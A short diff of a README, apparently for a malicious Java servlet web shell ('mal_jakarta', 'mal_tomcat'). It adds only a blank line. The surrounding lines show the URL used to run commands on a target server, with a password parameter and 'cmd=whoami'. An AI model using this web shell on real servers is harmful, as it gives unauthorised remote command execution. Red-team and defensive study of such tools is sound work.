@@ -36,4 +36,5 @@ Once uploaded the servlet should be accessible via a URL simmilar to:
 http(s)://<<TARGET>>/<<DEPLOY_PATH>>/mal_jakarta?pass=<<PASSWORD>>&cmd=whoami
 ```
 **Note 1**: Usually the "\<\<DEPLOY_PATH\>\>" is "mal_tomcat".
+
 **Note 2**: Replace "\<\<PASSWORD\>\>" in the request with the the password you have set up during the compilation step.
